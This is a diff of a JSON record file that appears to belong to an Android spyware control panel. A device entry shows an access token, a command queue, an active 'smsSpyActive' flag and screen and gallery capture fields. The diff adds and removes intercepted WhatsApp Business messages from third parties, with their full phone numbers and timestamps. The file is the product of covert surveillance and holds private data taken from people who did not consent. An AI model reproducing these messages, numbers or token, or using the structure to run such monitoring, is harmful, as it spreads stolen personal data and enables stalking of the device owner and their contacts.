@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775633836895,
+    "lastSeen": 1775633839872,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎3 pesan dari 2 chat",
+        "time": "08/04 14:37",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633841021
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 898-7564-441",
+        "content": "Gw isi di ay payment",
+        "time": "08/04 14:37",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633841015
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 815-2386-4283",
+        "content": "taruu di gb ajaaa",
+        "time": "08/04 14:37",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633840843
+      },
       {
         "appName": "WA Business",
         "sender": "WA Business",
@@ -4302,30 +4326,6 @@
         "time": "08/04 14:21",
         "pkg": "com.whatsapp.w4b",
         "receivedAt": 1775632904712
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 898-7564-441",
-        "content": "Real gak  swb nya",
-        "time": "08/04 14:21",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775632904609
-      },
-      {
-        "appName": "WA Business",
-        "sender": "WA Business",
-        "content": "‎‎8 pesan dari 3 chat",
-        "time": "08/04 14:21",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775632894587
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 898-7564-441",
-        "content": "P",
-        "time": "08/04 14:21",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775632894471
       }
     ],
     "galleryPhotos": [],
